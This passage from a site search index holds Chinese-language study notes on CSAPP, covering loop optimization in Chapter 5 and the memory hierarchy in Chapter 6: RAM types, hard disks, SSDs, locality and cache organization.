//\u51fd\u6570 vec_length \u8ba1\u7b97\u5411\u91cf\u957f\u5ea6\n        data_t val;\n        get_vec_element(v,i,&amp;val);\n        //\u51fd\u6570 get_vec_element \u7528\u6765\u53d6\u5411\u91cf\u5143\u7d20\n        *dest = *dest OP val;\n    }\n}\n</code></pre> <p>\u8fd9\u6bb5\u51fd\u6570\u53ef\u4f18\u5316\u7684\u70b9\u5728\u4e8e\uff1a</p> <ul> <li><code>for</code> \u5faa\u73af\u6bcf\u6b21\u8fed\u4ee3\u90fd\u8981\u8c03\u7528\u51fd\u6570 <code>vec_length</code>\uff0c\u5b9e\u9645\u4e0a\uff0c\u5411\u91cf\u957f\u5ea6\u4e0d\u4f1a\u968f\u7740\u8c03\u7528\u800c\u6539\u53d8<ul> <li>\u6240\u4ee5\u53ef\u4ee5\u5728\u5faa\u73af\u5f00\u59cb\u524d\u5c31\u8c03\u7528 <code>vec_length</code> \uff0c\u5c06\u7ed3\u679c\u8d4b\u503c\u7ed9\u5c40\u90e8\u53d8\u91cf</li> </ul> </li> <li>\u540c\u7406\uff0c<code>for</code> \u5faa\u73af\u4e2d\u53e6\u4e00\u4e2a\u51fd\u6570\u8c03\u7528 <code>get_vec_element</code> \u4e5f\u53ef\u4ee5\u79fb\u51fa<ul> <li>\u6539\u5199\u8be5\u51fd\u6570\uff0c\u4f7f\u5176\u8fd4\u56de\u6570\u7ec4\u7684\u8d77\u59cb\u5730\u5740\uff0c\u76f4\u63a5\u8bbf\u95ee\u6570\u7ec4\u5143\u7d20</li> </ul> </li> <li>\u6bcf\u6b21\u5faa\u73af\u90fd\u8981\u8bfb\u5199 <code>*dest</code> \u7684\u503c\uff0c\u8fd9\u662f\u4e0d\u5fc5\u8981\u7684\u5185\u5b58\u5f15\u7528<ul> <li>\u53ef\u4ee5\u5f15\u5165\u4e00\u4e2a\u4e34\u65f6\u53d8\u91cf <code>acc</code>\uff0c\u7528\u6765\u8bb0\u5f55\u7d2f\u8ba1\u7684\u7ed3\u679c\uff0c\u76f4\u5230\u5faa\u73af\u7ed3\u675f\u540e\u518d\u628a\u7ed3\u679c\u5199\u5165\u76ee\u7684\u5730\u5740 (\u4fee\u6539\u5bc4\u5b58\u5668\u6bd4\u5185\u5b58\u5feb)</li> </ul> </li> </ul> <pre><code>void combine4(vec_ptr v, data_t *dest){\n    long i;\n    long length = vec_length(v);\n    data_t *data = get_vec_start(v);\n    data_t acc = IDENT;\n    for(i = 0;i &lt; length; i++ ){\n        acc = acc OP data[i];\n    }\n    *dest = acc;\n}\n</code></pre> \u7a0b\u5e8f\u6027\u80fd\u7684\u63d0\u5347 <p></p>"},{"location":"Accumulation/CSAPP/Chapter5/#_4","title":"\u4ece\u5904\u7406\u5668\u89d2\u5ea6\u4f18\u5316\u7a0b\u5e8f\u6027\u80fd","text":"<p>\u73b0\u4ee3\u5904\u7406\u5668\u80fd\u591f\u540c\u65f6\u6267\u884c\u591a\u6761\u6307\u4ee4\uff0c\u8fd9\u79cd\u6280\u672f\u88ab\u79f0\u4e3a \u6307\u4ee4\u7ea7\u5e76\u884c</p> <p>\u8fd9\u7ae0\u5185\u5bb9\u4e0d\u60f3\u505a\u7b14\u8bb0\u4e86\uff01</p> <p>\u8fd9\u7ae0\u5185\u5bb9\u4e0d\u60f3\u505a\u7b14\u8bb0\u4e86\uff01</p> <p>\u8fd9\u7ae0\u5185\u5bb9\u4e0d\u60f3\u505a\u7b14\u8bb0\u4e86\uff01</p>"},{"location":"Accumulation/CSAPP/Chapter6/","title":"CH 6. \u5b58\u50a8\u5668\u5c42\u6b21\u7ed3\u6784","text":""},{"location":"Accumulation/CSAPP/Chapter6/#chapter-6-the-memory-hierarchy","title":"Chapter 6. The Memory Hierarchy","text":"<p> \u7ea6 2939 \u4e2a\u5b57  13 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 15 \u5206\u949f</p> <p>\u5b58\u50a8\u5668\u7cfb\u7edf\u6574\u4f53\u6784\u9020</p> <p></p> <p>\u5bc4\u5b58\u5668\u4e2d\u7684\u6570\u636e\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528\uff1b\u83b7\u53d6 cache \u4e2d\u7684\u6570\u636e\uff0c\u9700\u8981 4-75 \u65f6\u949f\u5468\u671f\uff1b\u83b7\u53d6\u5185\u5b58\u4e2d\u7684\u6570\u636e\uff0c\u9700\u8981\u51e0\u767e\u4e2a\u65f6\u949f\u5468\u671f</p>"},{"location":"Accumulation/CSAPP/Chapter6/#random-access-memory","title":"Random Access Memory","text":"<p>\u968f\u673a\u8bbf\u95ee\u5b58\u50a8\u5668 (RAM) \u5206\u4e3a\u4e24\u7c7b\uff1a</p> <ul> <li>Static RAM (\u9759\u6001RAM\uff0cSRAM)</li> <li>Dynamic RAM (\u52a8\u6001RAM\uff0cDRAM)</li> </ul> <p>\u5176\u4e2d SRAM \u5c06\u6bcf\u4e2a bit \u4f4d\u7684\u4fe1\u606f\u5b58\u50a8\u5728\u4e00\u4e2a\u53cc\u7a33\u6001\u7684\u5b58\u50a8\u5668\u5355\u5143\u5185\uff0c\u6bcf\u4e2a\u5b58\u50a8\u5355\u5143\u9700\u8981\u516d\u4e2a\u6676\u4f53\u7ba1\u6765\u5b9e\u73b0\u3002\u6b63\u662f\u7531\u4e8e SRAM \u53cc\u7a33\u6001\u7684\u7279\u6027\uff0c\u53ea\u8981\u6709\u7535\uff0c\u5c31\u80fd\u591f\u4e00\u76f4\u4fdd\u6301\u5b58\u50a8\u7684\u6570\u636e\u3002</p> <p>\u4e0e SRAM \u76f8\u6bd4\uff0cDRAM \u91c7\u53d6\u7535\u5bb9\u5145\u7535\u65b9\u5f0f\u5b58\u50a8\u4fe1\u606f\u3002DRAM \u7684\u5b58\u50a8\u5355\u5143\u5bf9\u5e72\u6270\u5341\u5206\u654f\u611f\uff0c\u5f53\u7535\u5bb9\u7684\u7535\u538b\u88ab\u6270\u4e71\u4e4b\u540e\uff0c\u5c31\u518d\u4e5f\u65e0\u6cd5\u6062\u590d\u5230\u5e72\u6270\u4e4b\u524d\u3002</p> <p>\u867d\u7136 SRAM \u7684\u901f\u5ea6\u8981\u6bd4 DRAM \u66f4\u5feb\uff0c\u4f46\u662f\u4ef7\u683c\u66f4\u8d35\u3002\u7efc\u5408\u4ee5\u4e0a\u8003\u8651\uff0c\u5904\u7406\u5668\u82af\u7247\u5185\u7684\u9ad8\u901f\u7f13\u5b58 (cache) \u91c7\u7528 SRAM \uff0c\u800c\u5185\u5b58\u91c7\u7528 DRAM</p> <p>DRAM \u7684\u53e6\u4e00\u4e2a\u7f3a\u9677</p> <p>DRAM \u7684\u7535\u5bb9\u4f1a\u6709\u5f88\u591a\u539f\u56e0\u5bfc\u81f4\u6f0f\u7535\uff0c\u662f\u7684 DRAM \u5728 10-100ms \u5185\u5931\u53bb\u7535\u8377\uff0c\u56e0\u6b64\u5185\u5b58\u7cfb\u7edf\u9700\u8981\u4e0d\u65ad\u7684\u8bfb\u51fa\u6570\u636e\uff0c\u7136\u540e\u91cd\u5199\u6765\u5237\u65b0\u5185\u5b58\u7684\u6bcf\u4e00\u4f4d</p> <p>\u7ec6\u8282\u8bf7\u53c2\u8003 CH 7. Memory Basics - Nimisora's Notes \uff0c\u6211\u4e0d\u518d\u91cd\u590d\u642c\u8fd0\u4e86</p> <p>DDR SDRAM</p> <p>Double Data-Rate Synchronous DRAM \u53cc\u500d\u901f\u7387\u540c\u6b65\u52a8\u6001\u968f\u673a\u5b58\u50a8\u5668</p> <p>\u8fd9\u91cc\u7684\u7f29\u5199 <code>S</code> \u6307\u7684\u662f\u540c\u6b65\uff0c\u800c\u4e0d\u662f\u9759\u6001\u3002\u53ea\u9700\u8981\u4e86\u89e3\u540c\u6b65 DRAM \u6bd4\u5f02\u6b65 DRAM \u5feb\u5373\u53ef</p>"},{"location":"Accumulation/CSAPP/Chapter6/#_1","title":"\u673a\u68b0\u78c1\u76d8","text":"<p>\u76ee\u524d\u5e02\u9762\u4e0a\u4e3b\u6d41\u7684\u78c1\u76d8 (disk) \u4ea7\u54c1\u6709\u4e24\u7c7b\uff0c\u5206\u522b\u662f\u673a\u68b0\u78c1\u76d8\u548c\u56fa\u6001\u786c\u76d8</p> <p>\u673a\u68b0\u78c1\u76d8\uff0c\u4e5f\u79f0\u65cb\u8f6c\u78c1\u76d8\u3002\u5b83\u4e3b\u8981\u4f9d\u9760\u76d8\u7247\u6765\u5b58\u50a8\u6570\u636e\uff0c\u76d8\u7247\u8868\u9762\u6d82\u6709\u78c1\u6027\u7684\u8bb0\u5f55\u6750\u6599\uff0c\u76d8\u7247\u6b63\u53cd\u4e24\u9762\u90fd\u53ef\u4ee5\u7528\u6765\u5b58\u50a8\u6570\u636e\u3002\u901a\u5e38\u60c5\u51b5\u4e0b\uff0c\u78c1\u76d8\u7531\u4e00\u4e2a\u6216\u591a\u4e2a\u76d8\u7247\u7ec4\u6210\uff0c\u8fd9\u4e9b\u76d8\u7247\u88ab\u56fa\u5b9a\u5728\u4e00\u4e2a\u53ef\u4ee5\u65cb\u8f6c\u7684\u4e3b\u8f74\u4e0a\uff0c\u4e3b\u8f74\u5e26\u52a8\u76d8\u7247\u4ee5\u56fa\u5b9a\u901f\u7387\u8fdb\u884c\u9ad8\u901f\u65cb\u8f6c\u3002</p> <p></p> <p>\u5176\u4e2d\u76d8\u7247\u8868\u9762\u88ab\u5212\u5206\u4e3a\u4e00\u5708\u4e00\u5708\u7684\u78c1\u9053\uff08tracks\uff09\uff0c\u6bcf\u4e2a\u78c1\u9053\u53c8\u88ab\u5212\u5206\u4e3a\u591a\u4e2a\u6247\u533a\uff08sectors\uff09\uff0c\u901a\u5e38\u60c5\u51b5\u4e0b\u6bcf\u4e2a\u6247\u533a\u53ef\u4ee5\u5b58\u50a8 512 \u5b57\u8282\u7684\u6570\u636e\u3002\u6247\u533a\u4e0e\u6247\u533a\u4e4b\u95f4\u53c8\u5b58\u5728\u95f4\u9699 \uff08gaps\uff09\uff0c\u7528\u6765\u5b58\u653e\u6247\u533a\u7684\u6807\u8bc6\u4fe1\u606f</p> <p></p> <p>\u78c1\u76d8\u901a\u8fc7\u8bfb\u5199\u5934\u6765\u8bfb\u5199\u78c1\u76d8\u6570\u636e\uff0c\u76d8\u7247\u7684\u6bcf\u4e2a\u8868\u9762\u90fd\u5bf9\u5e94\u7740\u4e00\u4e2a\u72ec\u7acb\u7684\u8bfb\u5199\u5934\uff0c\u6240\u6709\u7684\u8bfb\u5199\u5934\u90fd\u8fde\u63a5\u5230\u4e00\u4e2a\u4f20\u52a8\u81c2\u4e0a\uff0c\u901a\u8fc7\u4f20\u52a8\u81c2\u5728 \u534a\u5f84\u65b9\u5411 \u4e0a\u7684\u79fb\u52a8\uff0c\u8bfb\u5199\u4efb\u610f\u78c1\u9053\u4e0a\u7684\u6570\u636e\uff0c\u8fd9\u79cd\u673a\u68b0\u8fd0\u52a8\u4e5f\u88ab\u79f0\u4e3a\u5bfb\u9053\u3002\u8bfb\u5199\u5934\u56fa\u5b9a\u4e3a\u4e00\u4e2a\u78c1\u9053\u540e\uff0c\u901a\u8fc7\u914d\u5408\u76d8\u7247\u65cb\u8f6c\u5b8c\u6210\u5bf9\u76ee\u6807\u6247\u533a\u7684\u8bfb\u5199\u64cd\u4f5c</p> <p></p> <p>\u6240\u6709\u7684\u8bfb\u5199\u5934\u90fd\u662f\u5782\u76f4\u6392\u5217\uff0c\u4e00\u81f4\u884c\u52a8\u7684</p> <p><code>GB</code>\u548c<code>TB</code>\u7684\u542b\u4e49\u8981\u89c6\u4e0a\u4e0b\u6587\u800c\u5b9a</p> <p>\u51b7\u77e5\u8bc6\uff0c\u4e70\u6765\u7684\u78c1\u76d8\u4e0a\u6807\u7740\u7684<code>GB</code>\uff0c<code>TB</code>\u5176\u5b9e\u5bf9\u5e94\u7740 \\(1GB=10^9bytes\\) \u548c \\(1TB=10^{12}bytes\\)</p> <p>\u9664\u4e86\u5bb9\u91cf\u4e4b\u5916\uff0c\u78c1\u76d8\u7684\u8bfb\u5199\u901f\u5ea6\u4e5f\u662f\u4e00\u4e2a\u975e\u5e38\u91cd\u8981\u7684\u6307\u6807\uff0c\u5bf9\u6247\u533a\u7684\u8bbf\u95ee\u65f6\u95f4\u4e3b\u8981\u5206\u4e3a\u4e09\u90e8\u5206\uff0c\u5206\u522b\u662f\u5bfb\u9053\u65f6\u95f4\u3001\u65cb\u8f6c\u65f6\u95f4\u4ee5\u53ca\u4f20\u9001\u65f6\u95f4</p> \\[ T_{access} =T_{seek} +T_{rotation} +T_{transfer} \\] <ul> <li>Seek time \u5bfb\u9053\u65f6\u95f4<ul> <li>\u5f53\u76ee\u6807\u6247\u533a\u6240\u5904\u78c1\u9053\u4e0e\u5f53\u524d\u8bfb\u5199\u5934\u6240\u5904\u78c1\u9053\u4e0d\u540c\u65f6\uff0c\u4f20\u52a8\u81c2\u9700\u8981\u5c06\u8bfb\u5199\u5934\u79fb\u52a8\u5230\u76ee\u6807\u6247\u533a\u6240\u5728\u78c1\u9053\uff0c\u4f20\u52a8\u81c2\u79fb\u52a8\u6240\u9700\u65f6\u95f4\u5373\u5bfb\u9053\u65f6\u95f4</li> <li>\u5bfb\u9053\u65f6\u95f4\u53d6\u51b3\u4e8e\u8bfb\u5199\u5934\u5f53\u524d\u6240\u5728\u4f4d\u7f6e\u4e0e\u76ee\u6807\u4f4d\u7f6e\u7684\u8ddd\u79bb</li> <li>\u901a\u8fc7\u5bf9\u968f\u673a\u6247\u533a\u7684\u8bbf\u95ee\u6d4b\u8bd5\uff0c\u901a\u5e38\u5e73\u5747\u5bfb\u9053\u65f6\u95f4\u4e3a 3~9ms \u5de6\u53f3</li> </ul> </li> <li>Rotation  latency \u65cb\u8f6c\u65f6\u95f4<ul> <li>\u76ee\u6807\u6247\u533a\u7684\u7b2c\u4e00\u4e2a\u6570\u636e\u4f4d\u65cb\u8f6c\u5230\u8bfb\u5199\u5934\u4e0b\u6240\u9700\u7684\u65f6\u95f4</li> <li>\u8fd9\u4e2a\u8fc7\u7a0b\u7531\u5f53\u524d\u8bfb\u5199\u5934\u6240\u5728\u6247\u533a\u4f4d\u7f6e\u8ddf\u76ee\u6807\u6247\u533a\u7684\u4f4d\u7f6e\u4ee5\u53ca\u76d8\u7247\u65cb\u8f6c\u901f\u5ea6\u6765\u51b3\u5b9a</li> </ul> </li> <li>Transfer time \u4f20\u9001\u65f6\u95f4<ul> <li>\u4e00\u4e2a\u6247\u533a\u7684\u4f20\u9001\u65f6\u95f4\u4f9d\u8d56\u4e8e\u65cb\u8f6c\u901f\u5ea6\u4ee5\u53ca\u6bcf\u6761\u78c1\u9053\u7684\u6247\u533a\u6570\u76ee\uff0c\u5373\u8bfb\u5199\u5934\u7ecf\u8fc7\u8be5\u6247\u533a\u6240\u9700\u8981\u7684\u65f6\u95f4</li> </ul> </li> </ul> <p>\u8bbf\u95ee\u4e00\u4e2a\u78c1\u76d8\u6247\u533a\u6240\u82b1\u8d39\u7684\u65f6\u95f4\u4e3b\u8981\u662f\u5bfb\u9053\u65f6\u95f4\u548c\u65cb\u8f6c\u65f6\u95f4</p>"},{"location":"Accumulation/CSAPP/Chapter6/#_2","title":"\u56fa\u6001\u786c\u76d8","text":"<p>\u76f8\u6bd4\u673a\u68b0\u786c\u76d8\u4f7f\u7528\u4f20\u52a8\u81c2\u52a0\u76d8\u7247\u8fd9\u79cd\u673a\u68b0\u5f0f\u7684\u5de5\u4f5c\u65b9\u5f0f\uff0c\u56fa\u6001\u786c\u76d8\u7531\u4e00\u4e2a\u6216\u591a\u4e2a\u95ea\u5b58\u82af\u7247\u6784\u6210\u3002\u9664\u6b64\u4e4b\u5916\uff0c\u56fa\u6001\u786c\u76d8\u8fd8\u5305\u62ec\u4e00\u4e2a\u95ea\u5b58\u8f6c\u6362\u5c42\uff08flash translation layer,FTL\uff09\uff0c\u5b83\u7684\u529f\u80fd\u548c\u78c1\u76d8\u63a7\u5236\u5668\u7c7b\u4f3c\uff0c\u90fd\u662f\u5c06\u64cd\u4f5c\u7cfb\u7edf\u5bf9\u903b\u8f91\u5757\u7684\u8bf7\u6c42\u7ffb\u8bd1\u6210\u5bf9\u5e95\u5c42\u7269\u7406\u8bbe\u5907\u7684\u8bbf\u95ee\uff0c\u4e0d\u540c\u7684\u662f\u95ea\u5b58\u82af\u7247\u662f\u57fa\u4e8e Nand Flash \u5b9e\u73b0\u7684</p> <p>\u95ea\u5b58\u82af\u7247\u7684\u5185\u90e8\u7ed3\u6784\u7ec4\u6210\uff1a</p> <p></p> <ul> <li>\u6bcf\u4e2a\u95ea\u5b58\u82af\u7247\u662f\u7531\u4e00\u4e2a\u6216\u591a\u4e2a Die \u7ec4\u6210\uff0c\u6bcf\u4e2a Die \u53ef\u4ee5\u5206\u4e3a\u591a\u4e2a plane\uff0c\u6bcf\u4e2a plane \u5305\u542b\u591a\u4e2a block\uff0cblock \u5185\u90e8\u88ab\u5206\u4e3a\u4e86\u591a\u4e2a page</li> <li>\u5bf9\u4e8e\u56fa\u6001\u786c\u76d8\uff0c\u6570\u636e\u90fd\u662f\u4ee5 page \u4e3a\u5355\u4f4d\u8fdb\u884c\u8bfb\u5199\u7684</li> <li>\u4e0e\u673a\u68b0\u78c1\u76d8\u6bcf\u4e2a\u6247\u533a\u90fd\u4e3a 512 \u5b57\u8282\u76f8\u6bd4\uff0c\u5bf9\u4e8e\u4e0d\u540c\u89c4\u683c\u7684\u95ea\u5b58\u82af\u7247\uff0c\u5176\u4e2d\u7684 page \u5927\u5c0f\u53ef\u80fd\u4e0d\u5c3d\u76f8\u540c</li> <li>\u56fa\u6001\u786c\u76d8\u9664\u4e86\u8bfb\u3001\u5199\u4e24\u4e2a\u57fa\u672c\u64cd\u4f5c\u5916\uff0c\u8fd8\u591a\u4e86\u4e00\u4e2a \u64e6\u9664 \u64cd\u4f5c<ul> <li>\u7531\u4e8e\u6280\u672f\u9650\u5236\uff0c\u5199\u5165\u64cd\u4f5c \u53ea\u80fd\u5c06 <code>1</code> \u6539\u6210 <code>0</code></li> <li>\u6240\u4ee5\u4e00\u4e2a page \u5728\u5199\u5165\u6570\u636e\u524d\uff0c\u6240\u6709\u7684\u5b58\u50a8\u4f4d\u90fd\u4e3a <code>1</code></li> <li>\u5728\u5199\u5165 page \u4e4b\u524d\uff0c\u9700\u8981\u5148\u64e6\u9664\u6574\u4e2a block \uff0c\u4e0d\u80fd\u76f4\u63a5\u8986\u76d6<ul> <li>\u6362\u53e5\u8bdd\u8bf4\uff0c\u5199\u5165\u64cd\u4f5c\u4ee5 page \u4e3a\u5355\u4f4d\uff1b\u64e6\u9664\u64cd\u4f5c\u4ee5 block \u4e3a\u5355\u4f4d</li> </ul> </li> </ul> </li> </ul> <p>\u6bd4\u8d77\u673a\u68b0\u786c\u76d8\uff0c\u56fa\u6001\u786c\u76d8\u6709\u5f88\u591a\u4f18\u70b9\u3002\u7531\u4e8e\u5b83\u662f\u7531\u534a\u5bfc\u4f53\u6784\u6210\u7684\uff0c\u6ca1\u6709\u79fb\u52a8\u7684\u673a\u68b0\u90e8\u4ef6\uff0c\u56e0\u6b64\u968f\u673a\u8bbf\u95ee\u65f6\u95f4\u6bd4\u673a\u68b0\u78c1\u76d8\u8981\u5feb\uff0c\u529f\u8017\u4e5f\u66f4\u4f4e\uff0c\u540c\u65f6\u4e5f\u66f4\u6297\u6454\u3002\u7f3a\u70b9\u5c31\u662f\u56fa\u6001\u786c\u76d8\u7684\u4ef7\u683c\u8f83\u8d35\u3002</p>"},{"location":"Accumulation/CSAPP/Chapter6/#_3","title":"\u7a0b\u5e8f\u7684\u5c40\u90e8\u6027","text":"<p>\u5bf9\u4e8e\u73b0\u4ee3\u5b58\u50a8\u79d1\u6280\uff0cDRAM \u548c\u78c1\u76d8\u7684\u6027\u80fd\u6ede\u540e\u4e8e CPU \u6027\u80fd\uff0c\u5982\u679c\u8003\u8651\u591a\u6838\u6280\u672f\uff0cCPU \u4e0e\u5b58\u50a8\u8bbe\u5907\u7684\u6027\u80fd\u5dee\u8ddd\u4f1a\u8fdb\u4e00\u6b65\u589e\u5927\u3002\u4e3a\u4e86\u5f25\u8865\u5904\u7406\u5668\u4e0e\u5185\u5b58\u7684\u5dee\u8ddd\uff0c\u5904\u7406\u5668\u82af\u7247\u4e2d\u4f7f\u7528\u4e86\u5927\u91cf\u57fa\u4e8e SRAM \u7684\u9ad8\u901f\u7f13\u5b58 cache\uff0c\u5176\u964d\u4f4e CPU \u7684\u8bbf\u5b58\u5ef6\u8fdf\u7684\u539f\u56e0\u4e4b\u4e00\u4e3a\u5e94\u7528\u7a0b\u5e8f\u5177\u6709\u5c40\u90e8\u6027\u7684\u7279\u70b9</p> <p>\u5c40\u90e8\u6027\u901a\u5e38\u6709\u4e24\u79cd\u4e0d\u540c\u8868\u73b0\u5f62\u5f0f\uff0c\u5206\u522b\u662f\u65f6\u95f4\u5c40\u90e8\u6027\u548c\u7a7a\u95f4\u5c40\u90e8\u6027\u3002</p> <p>\u5982\u679c\u88ab\u5f15\u7528\u8fc7\u7684\u6570\u636e\u5728\u5c06\u6765\u4e00\u6bb5\u65f6\u95f4\u8fd8\u4f1a\u88ab\u591a\u6b21\u5f15\u7528\uff0c\u53ef\u4ee5\u8bf4\u7a0b\u5e8f\u5177\u6709\u826f\u597d\u7684\u65f6\u95f4\u5c40\u90e8\u6027\uff1b</p> <p>\u5982\u679c\u4e00\u4e2a\u5185\u5b58\u4f4d\u7f6e\u88ab\u5f15\u7528\u4e86\u4e00\u6b21\uff0c\u90a3\u4e48\u7a0b\u5e8f\u5f88\u53ef\u80fd\u5728\u5c06\u6765\u4e00\u6bb5\u65f6\u95f4\u5f15\u7528\u6765\u81ea\u9644\u4ef6\u7684\u4e00\u4e2a\u5185\u5b58\u4f4d\u7f6e\uff0c\u53ef\u4ee5\u8bf4\u7a0b\u5e8f\u5177\u6709\u826f\u597d\u7684\u7a7a\u95f4\u5c40\u90e8\u6027\u3002</p> <p>\u6709\u4e00\u5bf9\u5411\u91cf\u5143\u7d20\u6c42\u548c\u7684\u51fd\u6570 <code>sumvec</code> :</p> <pre><code>int sumvec(int v[N]){\n    int i, sum = 0;\n    for(i = 0; i &lt; N;i++)\n        sum += v[i];\n    return sum;\n}\n</code></pre> <p>\u5176\u4e2d\u53d8\u91cf <code>sum</code> \u5728\u6bcf\u6b21\u5faa\u73af\u4e2d\u90fd\u88ab\u5f15\u7528\u4e00\u6b21\uff0c\u56e0\u6b64\u5bf9\u4e8e <code>sum</code> \u6765\u8bf4\u6709\u597d\u7684\u65f6\u95f4\u5c40\u90e8\u6027\uff1b</p> <p>\u53e6\u4e00\u65b9\u9762\uff0c\u7531\u4e8e <code>sum</code> \u662f\u4e2a\u6807\u91cf\uff0c\u4e0d\u5b58\u5728\u7a7a\u95f4\u5c40\u90e8\u6027\u7684\u7279\u70b9\uff0c\u4f46\u662f\u5bf9\u4e8e\u5411\u91cf <code>v</code> \uff0c\u8bfb\u53d6\u987a\u5e8f\u4e0e\u5b58\u50a8\u5728\u5185\u5b58\u7684\u987a\u5e8f\u662f\u4e00\u81f4\u7684\uff0c\u51fd\u6570\u6709\u826f\u597d\u7684\u7a7a\u95f4\u5c40\u90e8\u6027\u3002</p> <p>\u7531\u6b64\u884d\u751f\uff0c\u5bf9\u4e8e\u4e8c\u7ef4\u6570\u7ec4\u904d\u5386\uff0c\u5185\u5c42\u5faa\u73af\u4e3a\u884c\u7684\u7a0b\u5e8f\u8fd0\u884c\u901f\u5ea6\u5927\u4e8e\u5185\u5c42\u5faa\u73af\u4e3a\u5217\u7684</p>"},{"location":"Accumulation/CSAPP/Chapter6/#_4","title":"\u7f13\u5b58","text":"<p>Quote</p> <p>\u5b58\u50a8\u5668\u5c42\u6b21\u7ed3\u6784\u7684\u4e2d\u5fc3\u601d\u60f3\u662f\u901f\u5ea6\u66f4\u5feb\u3001\u5bb9\u91cf\u66f4\u5c0f\u7684\u8bbe\u5907\u4f5c\u901f\u5ea6\u66f4\u6162\u3001\u5bb9\u91cf\u66f4\u5927\u7684\u8bbe\u5907\u7684\u7f13\u5b58</p> <ul> <li>Cache Hit \u7f13\u5b58\u547d\u4e2d<ul> <li>\u5f53\u7a0b\u5e8f\u9700\u8981\u7b2c k+1 \u5c42\u7684\u6570\u636e d \u65f6\uff0c\u5b83\u9996\u5148\u4ece\u7b2c k \u5c42\u7684\u6570\u636e\u5757\u4e2d\u68c0\u7d22\u662f\u5426\u5305\u542b\u76ee\u6807\u6570\u636e d \u7684\u526f\u672c\u3002</li> <li>\u5982\u679c\u76ee\u6807\u6570\u636e d \u521a\u597d\u7f13\u5b58\u5728\u7b2c k \u5c42\uff0c\u8fd9\u79cd\u60c5\u51b5\u5373\u79f0\u4e3a\u7f13\u5b58\u547d\u4e2d</li> <li>\u53e6\u4e00\u65b9\u9762\uff0c\u5982\u679c\u7b2c k \u5c42\u6ca1\u6709\u7f13\u5b58\u6570\u636e d \uff0c\u8fd9\u79cd\u60c5\u51b5\u79f0\u4e3a\u7f13\u5b58\u4e0d\u547d\u4e2d (Cache Miss)<ul> <li>\u53d1\u751f\u7f13\u5b58\u4e0d\u547d\u4e2d\u7684\u65f6\u5019\uff0c\u4e14\u5982\u679c\u7b2c k \u5c42\u7f13\u5b58\u5df2\u6ee1\uff0c\u5176\u4e2d\u4e00\u4e2a\u6570\u636e\u5757\u4f1a\u88ab\u66ff\u6362\u4e3a\u5e26\u6709\u6570\u636e d \u7684\u5757\uff0c\u88ab\u66ff\u6362\u7684\u5757\u4e5f\u88ab\u79f0\u4e3a\u727a\u7272\u5757</li> </ul> </li> </ul> </li> </ul> <p>\u5e38\u7528\u7684\u66ff\u6362\u7b56\u7565\u6709\u968f\u673a\u66ff\u6362\u3001LRU\u3001LFU\u7b49</p> <p>\u57fa\u4e8e SRAM \u7684cache \u7684\u5185\u90e8\u7ed3\u6784\uff1a</p> <p></p> <ul> <li>\u6574\u4e2a cache \u88ab\u5212\u5206\u6210\u4e00\u4e2a\u6216\u591a\u4e2a set\uff0c\u6bcf\u4e2a set \u5305\u542b\u4e00\u4e2a\u6216\u591a\u4e2a cache line (\u9ad8\u901f\u7f13\u5b58\u884c) \uff0c\u6bcf\u4e2a cache line \u7531\u6709\u6548\u4f4d (valid) \u3001\u6807\u8bb0 (tag) \u4ee5\u53ca\u6570\u636e\u5757 (cache block) \u4e09\u90e8\u5206\u7ec4\u6210<ul> <li>\u5176\u4e2d\u6709\u6548\u4f4d\u957f\u5ea6\u4e3a 1 bit\uff0c\u5b83\u8868\u793a\u5f53\u524d cache line \u5b58\u50a8\u4fe1\u606f\u662f\u5426\u6709\u6548</li> <li>\u6807\u8bb0\u7528\u6765\u786e\u5b9a\u76ee\u6807\u6570\u636e\u662f\u5426\u5b58\u5728\u4e8e\u5f53\u524d cache line \u4e2d</li> </ul> </li> <li>\u901a\u5e38\uff0ccache \u7684\u7ed3\u6784\u53ef\u4ee5\u7528\u5143\u7ec4 (S,E,B,m) \u6765\u63cf\u8ff0\uff0c\u5176\u4e2d S \u6307 set \u7684\u4e2a\u6570\uff0cE \u6307 cache line \u7684\u884c\u6570\uff0cB \u6307 cache bliock \u7684\u4f4d\u6570\uff0cm \u6307 valid,tag,cache block \u4f4d\u6570\u548c</li> <li>cache \u7684\u5927\u5c0f\u6307\u6240\u6709\u6570\u636e\u5757\u7684\u548c\uff0c\u5176\u4e2d\u4e0d\u5305\u62ec\u6709\u6548\u4f4d\u548c\u6807\u8bb0\u4f4d\uff0c\u5373 <code>S*E*B</code></li> </ul> <p>\u76ee\u6807\u6570\u636e\u7684\u5730\u5740\u5212\u5206\u5982\u4e0b\uff1a</p> <pre><code>+---+---------+------------+\n|Tag|Set index|Block Offset| Address\n+---+---------+------------+\n</code></pre> <p>CPU \u4ece\u7f13\u5b58\u4e2d\u8bf7\u6c42\u76ee\u6807\u6570\u636e\uff0cCache \u6839\u636e Set index \u9009\u62e9\u5bf9\u5e94\u7684 set \uff0c\u5bf9 Tag \u8fdb\u884c\u5339\u914d\u627e\u5230\u5bf9\u5e94\u7684 cache line \uff0c\u6700\u540e\u518d\u6839\u636e Block Offset \u53d6\u51fa\u76ee\u6807\u6570\u636e</p> <p>\u4e3a\u4ec0\u4e48 Set index \u653e\u5728\u4e2d\u95f4\uff1f</p> <p>\u5047\u8bbe\u4f7f\u7528\u9ad8\u4f4d\u4f5c\u7ec4\u7d22\u5f15\u4f4d\uff0c\u90a3\u4e48\u4e00\u4e9b\u8fde\u7eed\u7684\u5185\u5b58\u5c31\u4f1a\u6620\u5c04\u5230\u76f8\u540c\u7684 set \u4e2d\u3002\u5982\u679c\u4e00\u4e2a\u7a0b\u5e8f\u5177\u6709\u826f\u597d\u7684\u7a7a\u95f4\u5c40\u90e8\u6027\uff0c\u4f1a\u5bfc\u81f4 cache \u7684\u4f7f\u7528\u7387\u5f88\u4f4e\u3002\u800c\u7528\u4e2d\u95f4\u4f4d\u4f5c\u4e3a\u7d22\u5f15\uff0c\u76f8\u90bb\u7684\u5185\u5b58\u5757\u603b\u662f\u6620\u5c04\u5230\u4e0d\u540c\u7684 set \u4e2d\u3002</p> <p></p> <p>\u6839\u636e\u6bcf\u4e2a set \u6240\u5305\u542b cache line \u7684\u884c\u6570\u4e0d\u540c\uff0ccache \u88ab\u5206\u4e3a\u4e0d\u540c\u7684\u7c7b\uff1a</p> <ul> <li>\u5f53\u6bcf\u4e2a set \u53ea\u6709\u4e00\u4e2a cache line \uff0c\u8fd9\u79cd\u7ed3\u6784\u7684 cache \u88ab\u79f0\u4e3a\u76f4\u63a5\u6620\u5c04 cache</li> 